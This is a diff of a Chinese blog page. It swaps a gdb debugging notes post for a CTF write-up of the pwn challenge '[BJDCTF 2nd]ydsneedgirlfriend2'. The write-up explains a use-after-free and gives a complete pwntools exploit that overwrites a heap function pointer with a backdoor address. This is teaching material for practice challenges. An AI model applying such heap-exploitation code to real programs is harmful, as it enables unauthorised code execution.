@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>gdb调试总结 | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" gdb ">
-  <meta name="description" content="gdb调试总结 | sixpar&#39;s blog">
+  <title>[BJDCTF 2nd]ydsneedgirlfriend2 | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" UAF , tcache dup ">
+  <meta name="description" content="[BJDCTF 2nd]ydsneedgirlfriend2 | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="about">
@@ -302,9 +302,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-gdb调试总结" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-BJDCTF-2nd-ydsneedgirlfriend2" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">gdb调试总结</h1>
+        <h1 class="article-title">[BJDCTF 2nd]ydsneedgirlfriend2</h1>
     
     <div class="article-meta">
         
@@ -314,7 +314,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="笔记">笔记</a>
+            <a  data-rel="PWN题">PWN题</a>
             
         </span>
         
@@ -322,19 +322,21 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color4">gdb</a>
+            <a class="color4">UAF</a>
+            
+            <a class="color1">tcache dup</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-03 08:17:40'>2020-07-03 07:10</time>
+            Created At : <time class="date" title='Updated At: 2020-07-03 12:36:39'>2020-07-03 12:22</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:1.1k</span>
+        <span>Count:775</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -364,7 +366,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#gdb下不同插件"><span class="toc-text">gdb下不同插件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何调试程序"><span class="toc-text">如何调试程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何调试exp"><span class="toc-text">如何调试exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调试指令总结"><span class="toc-text">调试指令总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#经验"><span class="toc-text">经验</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写在最后"><span class="toc-text">写在最后</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#保护机制"><span class="toc-text">保护机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析程序"><span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用思路："><span class="toc-text">漏洞利用思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp："><span class="toc-text">exp：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#关于sixpar的博客"><span class="toc-text">关于sixpar的博客</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -380,73 +382,29 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="gdb下不同插件"><a href="#gdb下不同插件" class="headerlink" title="gdb下不同插件"></a>gdb下不同插件</h2><p>包含 pwndbg 、peda、gef，它们的功能各不相同，所以需要来回切换。<br>安装过程看这篇文章</p>
-<blockquote>
-<p><a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
+        <p>本题是在学习tcache机制以及tcache attack时的一道例题</p>
+<h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><blockquote>
+<p>  Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)</p>
 </blockquote>
-<p>如果后续需要对堆进行调试分析，需要另外从下面地址安装pwndbg。</p>
+<p>本题据说可以利用 tcache dup的手法。 神似double free，但比double free更容易利用。</p>
+<h2 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h2><p>有backdoor后门函数直接getshell。</p>
+<p>add函数：变量count不能大于7，所以最大添加次数是8次。由代码*v0 = malloc(nbytes); 可知，nbytes变量是我们输入进去的大小，说明没有限制申请name的chunk块的大小，我们申请的size有多大就能malloc多大。<br>总之 girlfriend数组里的每一个chunk的结构如下：<br>固定头部pre_size和size，接着是 &amp;name 指针指向length大小的chunk空间，接着是一个打印函数。</p>
+<p>del函数：指针未置0，UAF漏洞。</p>
+<p>show函数：输入index判断存在，调用执行存于每个chunk中的打印函数。</p>
+<h2 id="漏洞利用思路："><a href="#漏洞利用思路：" class="headerlink" title="漏洞利用思路："></a>漏洞利用思路：</h2><p>利用tcache dup 连续释放两次相同的chunk，结合UAF漏洞，构造多指针指向同一个chunk，随后将打印函数覆盖为后门函数。</p>
+<p>当然还有更简单的做法：<br>本题add一个chunk，会对应两个chunk堆块。<br>堆块一的大小固定为0x20,分别存储prev_size,size, name指针，打印函数地址。<br>堆块二的大小根据用户输入的length决定。并且content部分存储name实际内容。</p>
+<p>于是我们 add(0x80,’aaaa’)   ，然后free掉， 现在chunk被放入了fastbin链表。</p>
 <blockquote>
-<p><a href="https://github.com/scwuaptx/Pwngdb" target="_blank" rel="noopener">https://github.com/scwuaptx/Pwngdb</a></p>
+<p>(0x20)  fastbin[0]: &emsp; 0x2176000 –&gt; 0x0</p>
 </blockquote>
-<p>其主要包含有parseheap、heapinfo、chunkinfo 等一些重要的关于heap的指令。</p>
-<h2 id="如何调试程序"><a href="#如何调试程序" class="headerlink" title="如何调试程序"></a>如何调试程序</h2><p>比如对名为pwn的程序进行调试：</p>
-<blockquote>
-<p>gdb ./pwn #开启gdb，并且file读取pwn程序<br>b main  #对main函数下断点<br>b *0x8048e40  #对某一地址进行下断点<br>b *0x56555000+0x655 #也可以基址+偏移的形式<br>r #运行程序，在输入某次数据后可以Ctrl+c 截断下来，看此时的堆栈情况。<br>start #以汇编的角度运行该程序，汇编代码将呈现在你眼前，另外还有寄存器和栈情况。<br>在指令“start”的基础上：<br>n #单步执行<br>c #自动运行到下一个断点处<br>got   #查看GOT表<br>finish  #结束掉（跳过）当前函数，直接就跳到了该函数的leave ret 处<br>q  #结束调试,或是输入detach退出</p>
-</blockquote>
-<h2 id="如何调试exp"><a href="#如何调试exp" class="headerlink" title="如何调试exp"></a>如何调试exp</h2><p>别人也许是用的gdb.attach()自动依附，或者是 raw_input()<br>但我个人习惯做法是在exp中想要断点的语句前 加一个 <strong>pause()</strong> ，然后gdb attach pid<br>开两个终端（按shift+ctrl+t 在一个终端的基础上同界面内创建新的终端 ，而shift+ctrl+n 则是在新界面新建终端），假如exp全称为 exp.py，第一个终端输入 gdb exp.py ，然后会自动停在pause()语句处，得到调试程序的PID假如是6845，然后在第二个终端里输入 gdb attach 6845 便可。<br>如果有多条pause语句，那么如何执行下一个pause语句？<br>第二个终端里先输入c（即continue）等待，然后Alt+1切换至第一个终端，敲一下回车，会显示停在第二个pause处，然后切换回第二个终端，按ctrl+c截断即可继续调试。</p>
-<p>个人经常使用的exp快捷键：</p>
-<blockquote>
-<p>把选中区域全部注释掉： ctrl + /<br>令选中区域缩进： tab<br>令选中区域顶格：shift+tab</p>
-</blockquote>
-<p>等等，要想 gdb attach pid 得注意：<br>ubuntu16.04 默认不允许普通用户gdb attach PID调试进程………我原先都是用root权限所以没遇到过这情况。<br>解决方法：<br>sudo vim /etc/sysctl.d/10-ptrace.conf<br>最后一行改为   kernel.yama.ptrace_scope = 0<br>去除限制！</p>
-<h2 id="调试指令总结"><a href="#调试指令总结" class="headerlink" title="调试指令总结"></a>调试指令总结</h2><p>详细的gdb调试指令请看：</p>
-<blockquote>
-<p><a href="https://blog.csdn.net/weixin_30697239/article/details/101103647" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30697239/article/details/101103647</a></p>
-</blockquote>
-<p>我这里列出我个人使用频繁的指令<br>gdb-peda下：   </p>
-<p>1.查看某一个地址(比如说0xf7e522b0)的详细信息，start，end，offset，位于哪个区域里</p>
-<blockquote>
-<p>xinfo 0xf7e522b0</p>
-</blockquote>
-<p>2.查看内存，可以找到libc程序加载的基址，还有heap等其他地址信息</p>
-<blockquote>
-<p>vmmap </p>
-</blockquote>
-<p>3.查看地址对应内存内容</p>
-<blockquote>
-<p>x/10gx 0x80485a6   </p>
-</blockquote>
-<p>4.查看地址对应的汇编代码</p>
-<blockquote>
-<p>x/20i 0x80484b6     </p>
-</blockquote>
-<p>5.看自栈顶esp开始向下20的栈的内容</p>
-<blockquote>
-<p>stack 20   </p>
-</blockquote>
-<p>6.查看寄存器ebp-0x20的内容</p>
-<blockquote>
-<p>x/w $ebp-0x20   </p>
-</blockquote>
-<p>7.查看内容</p>
-<blockquote>
-<p>telescope 0x8049700    </p>
-</blockquote>
-<p>8.计算我们输入的格式化字符串的地址与这个地址之间的偏移</p>
-<blockquote>
-<p>fmtarg 0x7fffffffdda8     </p>
-</blockquote>
-<p>9.查看堆分布</p>
-<blockquote>
-<p>parseheap    </p>
-</blockquote>
-<p>10.查看bins情况</p>
-<blockquote>
-<p>heapinfoall       </p>
-</blockquote>
-<h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><p>1.查找输入数据的去向<br>做一道题目时得到的启发：题目要求输入一串字符串，比如我们输入’AAABBBCCC’后ctrl+c断下来之后，<br>使用 find AAABBBCCC   就可以找得到字符串在内存中所储存的位置啦！</p>
-<p>2.如何应对PIE 地址随机化?<br>gdb ./pwn 打开gdb调试 ， 然后 r  加载运行程序 ， 然后在另开一个终端输入 ps -ef |grep pwn    得到pwn程序的PID ，然后 cat /proc/pid/maps  查看内存信息，得到基址，一般是第一行start地址，那么实际地址 = 基址+IDA的相对偏移。然后再在第一个终端正在运行的程序里下断点，进行后续操作，比如输入数据后ctrl+c断下来查看内存。</p>
-<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>目前只总结出这么多，后续若有新知识，一定会更新的。<br>恰早饭去咯~</p>
+<p>然后add一个0x20大小的chunk，就会把堆块一给申请回来了。现在我们对堆块一可写了。于是我们就把原先的打印函数覆盖为我们的后门函数。最后 show调用后门函数即可。</p>
+<h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                                                                                                                                                                                   </span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level='debug')</span></span><br><span class="line"><span class="comment"># def debug_pause():</span></span><br><span class="line"><span class="comment">#     log.info(proc.pidof(p))</span></span><br><span class="line"><span class="comment">#     pause()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice :'</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'the length of her name:'</span>, str(length))</span><br><span class="line">    p.sendafter(<span class="string">'her name:'</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice :'</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'Index :'</span>, str(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice :'</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'Index :'</span>, str(index))</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">proc_name = <span class="string">'./ydsneedgirlfriend2'</span></span><br><span class="line">p = process(proc_name)</span><br><span class="line"><span class="comment"># p = remote('node3.buuoj.cn', 27409)</span></span><br><span class="line">elf = ELF(proc_name)</span><br><span class="line">backdoor_addr = <span class="number">0x400d86</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b'a'</span>) </span><br><span class="line"><span class="comment">#申请一个chunk，会对应分配有两个堆块。</span></span><br><span class="line"><span class="comment">#堆块一的大小固定为0x20,分别存储prev_size,size, name指针，打印函数地址</span></span><br><span class="line"><span class="comment">#堆块二的大小根据用户输入的length决定。并且content部分存储name内容</span></span><br><span class="line"><span class="comment"># chunk0的结构如下：</span></span><br><span class="line"><span class="comment"># 0x2176000:	0x0000000000000000	0x0000000000000021</span></span><br><span class="line"><span class="comment"># 0x2176010:	0x0000000002176030	0x00000000004009ab</span></span><br><span class="line"><span class="comment"># 0x2176020:	0x0000000000000000	0x0000000000000091</span></span><br><span class="line"><span class="comment"># 0x2176030:	0x0000000000000061	0x0000000000000000</span></span><br><span class="line"><span class="comment">#                     ......              ......</span></span><br><span class="line"><span class="comment">#讲解：</span></span><br><span class="line"><span class="comment">#0x2176010存的指针指向该chunk存储name的内容0x2176030</span></span><br><span class="line"><span class="comment">#0x2176018存着打印函数</span></span><br><span class="line"><span class="comment">#从0x2176030开始的地方就是name内容。</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 0x2176000:	0x0000000000000000	0x0000000000000021</span></span><br><span class="line"><span class="comment"># 0x2176010:	0x0000000000000000	0x00000000004009ab</span></span><br><span class="line"><span class="comment"># 0x2176020:	0x0000000000000000	0x0000000000020fe1</span></span><br><span class="line"><span class="comment"># 0x2176030:	0x0000000000000061	0x0000000000000000</span></span><br><span class="line"><span class="comment">#此时：</span></span><br><span class="line"><span class="comment">#(0x20)  fastbin[0]: 0x2176000 --&gt; 0x0</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">0x10</span>, p64(<span class="number">0x0</span>) + p64(backdoor_addr))</span><br><span class="line"><span class="comment">#实际申请回的是chunk0的堆块一的mem部分</span></span><br><span class="line"><span class="comment"># 0x2176000:	0x0000000000000000	0x0000000000000021</span></span><br><span class="line"><span class="comment"># 0x2176010:	0x0000000000000000	0x0000000000400d86 #&lt;--已经修改了</span></span><br><span class="line"><span class="comment"># 0x2176020:	0x0000000000000000	0x0000000000020fe1</span></span><br><span class="line"><span class="comment"># 0x2176030:	0x0000000000000061	0x0000000000000000</span></span><br><span class="line"><span class="comment">#把0x2176018处的打印函数直接修改为后门函数即可，这一题确实简单了哈哈</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h3 id="关于sixpar的博客"><a href="#关于sixpar的博客" class="headerlink" title="关于sixpar的博客"></a>关于sixpar的博客</h3><p>到目前为止已经写了<code class="article_number"></code>篇文章， 共<code class="site_word_count"></code>字。</p>
+<p>本站访问人数：<code class="site_uv"></code>人次 ， 访问量：<code class="site_pv"></code>次</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
